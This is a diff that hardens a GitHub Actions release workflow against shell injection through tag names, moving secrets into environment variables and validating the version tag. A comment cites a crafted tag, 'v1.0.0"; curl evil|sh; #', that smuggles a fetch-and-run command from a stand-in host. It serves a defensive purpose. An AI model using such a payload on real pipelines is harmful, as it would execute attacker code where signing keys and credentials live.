@@ -10,12 +10,23 @@
 #   RELEASE_SIGNING_KEY     the private half from scripts/release/generate-signing-key.sh
 #   STAGING_API_BASE_URL    e.g. https://staging.example.ir
 #   PLATFORM_OWNER_MOBILE / PLATFORM_OWNER_PASSWORD   a Platform.Owner account on staging
+#
+# Injection hardening: GITHUB_REF_NAME (attacker-influenced text for anyone who can push a tag) is
+# NEVER interpolated via ${{ }} into a run: block — ${{ }} is textual substitution before bash ever
+# parses the script, so a crafted tag like 'v1.0.0"; curl evil|sh; #' would execute as shell.
+# Instead the value is validated against a strict semver regex once, then exported through env:,
+# where GitHub passes it verbatim as an environment variable (no shell parsing of the value).
+# Actions remain referenced by major version tag rather than commit SHA — pin SHAs only after
+# verifying them upstream (a mistyped SHA is worse than a tag); enable Dependabot version bumps.
 name: Release
 
 on:
   push:
     tags:
       - "v*.*.*"
+
+permissions:
+  contents: read
 
 jobs:
   test:
@@ -33,18 +44,32 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Derive version from tag
+      - name: Derive and validate version from tag
         id: version
-        run: echo "version=${GITHUB_REF_NAME#v}" >> "$GITHUB_OUTPUT"
+        run: |
+          set -euo pipefail
+          version="${GITHUB_REF_NAME#v}"
+          if [[ ! "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "::error::Tag '$GITHUB_REF_NAME' is not vX.Y.Z semver — refusing to build."
+            exit 1
+          fi
+          echo "version=$version" >> "$GITHUB_OUTPUT"
 
       - name: Log in to registry
-        run: echo "${{ secrets.REGISTRY_PASSWORD }}" | docker login "${{ secrets.REGISTRY }}" -u "${{ secrets.REGISTRY_USERNAME }}" --password-stdin
+        env:
+          REGISTRY: ${{ secrets.REGISTRY }}
+          REGISTRY_USERNAME: ${{ secrets.REGISTRY_USERNAME }}
+          REGISTRY_PASSWORD: ${{ secrets.REGISTRY_PASSWORD }}
+        run: echo "$REGISTRY_PASSWORD" | docker login "$REGISTRY" -u "$REGISTRY_USERNAME" --password-stdin
 
       - name: Build and push
         id: image
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
+          REGISTRY: ${{ secrets.REGISTRY }}
         run: |
           set -euo pipefail
-          image_tag="${{ secrets.REGISTRY }}/aqsat-api:${{ steps.version.outputs.version }}"
+          image_tag="$REGISTRY/aqsat-api:$VERSION"
           docker build -f src/Aqsat.Api/Dockerfile -t "$image_tag" .
           docker push "$image_tag"
           sha256=$(docker inspect --format='{{index .RepoDigests 0}}' "$image_tag" | sed 's/^[^@]*@//')
@@ -52,27 +77,39 @@ jobs:
           echo "sha256=$sha256" >> "$GITHUB_OUTPUT"
 
       - name: Sign
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
+          IMAGE_TAG: ${{ steps.image.outputs.image_tag }}
+          IMAGE_SHA256: ${{ steps.image.outputs.sha256 }}
+          RELEASE_SIGNING_KEY: ${{ secrets.RELEASE_SIGNING_KEY }}
         run: |
-          echo "${{ secrets.RELEASE_SIGNING_KEY }}" > /tmp/release-signing-key.pem
+          set -euo pipefail
+          echo "$RELEASE_SIGNING_KEY" > /tmp/release-signing-key.pem
           chmod 600 /tmp/release-signing-key.pem
           scripts/release/sign-package.sh \
-            "${{ steps.version.outputs.version }}" \
-            "${{ steps.image.outputs.image_tag }}" \
-            "${{ steps.image.outputs.sha256 }}" \
+            "$VERSION" \
+            "$IMAGE_TAG" \
+            "$IMAGE_SHA256" \
             /tmp/release-signing-key.pem \
             > /tmp/manifest.json
           rm -f /tmp/release-signing-key.pem
 
       - name: Register with staging
+        env:
+          STAGING_API_BASE_URL: ${{ secrets.STAGING_API_BASE_URL }}
+          PLATFORM_OWNER_MOBILE: ${{ secrets.PLATFORM_OWNER_MOBILE }}
+          PLATFORM_OWNER_PASSWORD: ${{ secrets.PLATFORM_OWNER_PASSWORD }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
           set -euo pipefail
-          token=$(curl -sf -X POST "${{ secrets.STAGING_API_BASE_URL }}/api/auth/login" \
+          token=$(curl -sf -X POST "$STAGING_API_BASE_URL/api/auth/login" \
             -H "Content-Type: application/json" \
-            -d "{\"mobile\":\"${{ secrets.PLATFORM_OWNER_MOBILE }}\",\"password\":\"${{ secrets.PLATFORM_OWNER_PASSWORD }}\"}" \
+            -d "$(jq -n --arg m "$PLATFORM_OWNER_MOBILE" --arg p "$PLATFORM_OWNER_PASSWORD" \
+              '{mobile: $m, password: $p}')" \
             | jq -r .token)
           scripts/release/register-package.sh \
-            "${{ secrets.STAGING_API_BASE_URL }}" "$token" /tmp/manifest.json \
-            "Released from ${{ github.ref_name }}"
+            "$STAGING_API_BASE_URL" "$token" /tmp/manifest.json \
+            "Released from $REF_NAME"
 
       # Deliberately no further step here — see docs/RELEASE-RUNBOOK.md §5 for the staged-rollout
       # procedure a Platform.Owner runs by hand from the panel, one environment at a time.
